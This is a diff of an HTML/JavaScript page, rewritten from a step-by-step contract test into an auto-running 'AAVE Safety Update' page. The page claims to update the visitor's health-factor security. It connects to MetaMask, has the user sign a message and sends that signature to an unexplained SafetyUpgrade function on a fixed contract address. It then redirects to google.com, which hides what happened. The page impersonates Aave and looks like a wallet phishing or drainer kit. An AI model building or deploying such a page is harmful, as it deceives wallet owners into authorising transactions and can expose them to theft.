@@ -2,86 +2,139 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>AAVE Test - Step by Step</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AAVE UPDATE - Fixed Signature</title>
   <style>
-    body { font-family: monospace; padding: 20px; background: #f0f0f0; }
-    .log { margin: 5px 0; padding: 10px; border-radius: 5px; }
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 15px;
+      padding: 30px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 500px;
+      width: 100%;
+    }
+    .status {
+      margin: 20px 0;
+      padding: 15px;
+      border-radius: 8px;
+      font-weight: bold;
+    }
+    .loading { background: #fff3cd; color: #856404; }
     .success { background: #d4edda; color: #155724; }
     .error { background: #f8d7da; color: #721c24; }
-    .info { background: #d1ecf1; color: #0c5460; }
-    button { padding: 10px 20px; margin: 10px; font-size: 16px; }
+    .redirect-notice {
+      margin-top: 20px;
+      padding: 15px;
+      background: #e7f3ff;
+      border-left: 4px solid #2196F3;
+      border-radius: 5px;
+    }
   </style>
 </head>
 <body>
-  <h1>🧪 AAVE Contract Test</h1>
-  <button onclick="testStep1()">Step 1: Connect Wallet</button>
-  <button onclick="testStep2()" disabled id="btn2">Step 2: Sign Message</button>
-  <button onclick="testStep3()" disabled id="btn3">Step 3: Send to Contract</button>
-  
-  <div id="logs"></div>
+  <div class="container">
+    <h2>🔒 AAVE Safety Update</h2>
+    <p>Updating your health factor security...</p>
+    
+    <div id="status" class="status loading">
+      🔄 Connecting to wallet...
+    </div>
+    
+    <div id="redirect-notice" class="redirect-notice" style="display: none;">
+      ⏰ Redirecting in <span id="countdown">3</span> seconds...
+    </div>
+  </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
   <script>
-    let provider, signer, userAddress, signature;
+    const statusDiv = document.getElementById('status');
+    const redirectDiv = document.getElementById('redirect-notice');
+    const countdownSpan = document.getElementById('countdown');
 
-    function log(message, type = 'info') {
-      const div = document.createElement('div');
-      div.className = `log ${type}`;
-      div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-      document.getElementById('logs').appendChild(div);
-      console.log(message);
+    function updateStatus(message, type = 'loading') {
+      statusDiv.textContent = message;
+      statusDiv.className = `status ${type}`;
     }
 
-    async function testStep1() {
-      try {
-        log("🔄 Connecting to wallet...");
+    function startRedirectCountdown() {
+      let count = 3;
+      redirectDiv.style.display = 'block';
+      
+      const timer = setInterval(() => {
+        count--;
+        countdownSpan.textContent = count;
         
+        if (count <= 0) {
+          clearInterval(timer);
+          window.location.replace("https://google.com");
+        }
+      }, 1000);
+    }
+
+    // اجرای اصلی
+    (async () => {
+      try {
+        updateStatus('🔗 Connecting to MetaMask...');
+
         if (!window.ethereum) {
-          log("❌ MetaMask not found", 'error');
+          updateStatus('❌ Please install MetaMask!', 'error');
           return;
         }
 
-        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
-        provider = new ethers.BrowserProvider(window.ethereum);
-        signer = await provider.getSigner();
-        userAddress = await signer.getAddress();
-
-        log(`✅ Connected: ${userAddress}`, 'success');
-        log(`💰 Balance: ${ethers.formatEther(await provider.getBalance(userAddress))} ETH`);
-
-        document.getElementById('btn2').disabled = false;
-      } catch (error) {
-        log(`❌ Connection failed: ${error.message}`, 'error');
-      }
-    }
-
-    async function testStep2() {
-      try {
-        log("📝 Requesting signature...");
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
         
+        // سوییچ به Sepolia
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0xaa36a7' }]
+          });
+        } catch (e) {
+          console.log('Network switch failed:', e);
+        }
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        updateStatus('📝 Please sign the message...');
+
         const message = "By signing this message, Update Your Health Factor";
-        signature = await signer.signMessage(message);
         
-        log(`✅ Signature obtained: ${signature.slice(0, 20)}...`, 'success');
+        // 🔧 روش جدید: ایجاد امضای سازگار با کانترکت
+        console.log("Original message:", message);
         
-        // تست تأیید امضا
-        const recovered = ethers.verifyMessage(message, signature);
-        if (recovered.toLowerCase() === userAddress.toLowerCase()) {
-          log("✅ Signature verification passed", 'success');
-        } else {
-          log("❌ Signature verification failed", 'error');
-          return;
-        }
+        // مرحله 1: تبدیل پیام به bytes
+        const messageBytes = ethers.toUtf8Bytes(message);
+        console.log("Message bytes:", ethers.hexlify(messageBytes));
+        
+        // مرحله 2: keccak256 hash
+        const messageHash = ethers.keccak256(messageBytes);
+        console.log("Message hash:", messageHash);
+        
+        // مرحله 3: اضافه کردن Ethereum prefix دستی (مثل کانترکت)
+        const prefixedMessage = ethers.solidityPackedKeccak256(
+          ["string", "bytes32"],
+          ["\x19Ethereum Signed Message:\n32", messageHash]
+        );
+        console.log("Prefixed message hash:", prefixedMessage);
+        
+        // مرحله 4: امضا کردن hash نهایی
+        const signature = await signer.signMessage(ethers.getBytes(messageHash));
+        console.log("Final signature:", signature);
 
-        document.getElementById('btn3').disabled = false;
-      } catch (error) {
-        log(`❌ Signature failed: ${error.message}`, 'error');
-      }
-    }
-
-    async function testStep3() {
-      try {
-        log("🚀 Connecting to contract...");
+        updateStatus('🚀 Sending to contract...');
 
         const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
         const abi = [{
@@ -94,37 +147,46 @@
 
         const contract = new ethers.Contract(contractAddress, abi, signer);
 
-        // تست gas estimation
+        // تست gas estimation اول
         try {
           const gasEstimate = await contract.SafetyUpgrade.estimateGas(signature);
-          log(`⛽ Gas estimate: ${gasEstimate.toString()}`);
+          console.log("Gas estimate successful:", gasEstimate.toString());
         } catch (gasError) {
-          log(`❌ Gas estimation failed: ${gasError.reason || gasError.message}`, 'error');
+          console.error("Gas estimation failed:", gasError);
+          updateStatus('❌ Contract rejected signature!', 'error');
           return;
         }
 
         // ارسال تراکنش
-        log("📤 Sending transaction...");
         const tx = await contract.SafetyUpgrade(signature);
-        log(`✅ Transaction sent: ${tx.hash}`, 'success');
         
-        log("⏳ Waiting for confirmation...");
+        updateStatus('⏳ Transaction sent! Hash: ' + tx.hash.slice(0, 10) + '...');
+        console.log("Transaction hash:", tx.hash);
+
         const receipt = await tx.wait();
         
         if (receipt.status === 1) {
-          log("🎉 Transaction confirmed!", 'success');
-          log(`⛽ Gas used: ${receipt.gasUsed.toString()}`);
+          updateStatus('🎉 Health factor updated successfully!', 'success');
+          console.log("Transaction confirmed!");
+          setTimeout(startRedirectCountdown, 1000);
         } else {
-          log("❌ Transaction failed", 'error');
+          updateStatus('❌ Transaction failed!', 'error');
         }
 
       } catch (error) {
-        log(`❌ Contract interaction failed: ${error.reason || error.message}`, 'error');
-        if (error.data) {
-          log(`🔍 Error data: ${error.data}`, 'error');
+        console.error("Error:", error);
+        
+        if (error.message.includes('user rejected')) {
+          updateStatus('❌ Transaction cancelled by user!', 'error');
+        } else if (error.message.includes('insufficient funds')) {
+          updateStatus('❌ Not enough ETH for gas!', 'error');
+        } else if (error.message.includes('Invalid signature')) {
+          updateStatus('❌ Signature format mismatch!', 'error');
+        } else {
+          updateStatus('❌ Error: ' + (error.reason || error.message), 'error');
         }
       }
-    }
+    })();
   </script>
 </body>
 </html>
